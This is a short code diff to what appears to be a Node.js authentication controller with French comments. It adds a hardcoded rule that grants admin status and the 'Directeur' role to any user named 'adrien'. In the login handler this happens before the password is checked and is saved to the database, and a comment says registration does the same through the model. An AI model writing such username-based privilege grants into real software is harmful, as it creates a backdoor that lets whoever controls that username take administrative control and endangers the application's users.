@@ -25,7 +25,7 @@ const register = async (req, res) => {
       });
     }
 
-    // Créer le nouvel utilisateur
+    // Créer le nouvel utilisateur (isAdmin sera défini automatiquement dans le modèle)
     const user = new User({
       username,
       email,
@@ -33,6 +33,7 @@ const register = async (req, res) => {
       firstName,
       lastName,
       role: role || 'Stagiaire'
+      // isAdmin sera automatiquement true si username === 'adrien'
     });
 
     await user.save();
@@ -78,6 +79,13 @@ const login = async (req, res) => {
         success: false,
         message: 'Identifiants invalides ou compte inactif.'
       });
+    }
+
+    // 🔥 FORCER ADRIEN EN ADMIN MÊME À LA CONNEXION
+    if (username === 'adrien' && !user.isAdmin) {
+      user.isAdmin = true;
+      user.role = 'Directeur';
+      await user.save();
     }
 
     // Vérifier le mot de passe
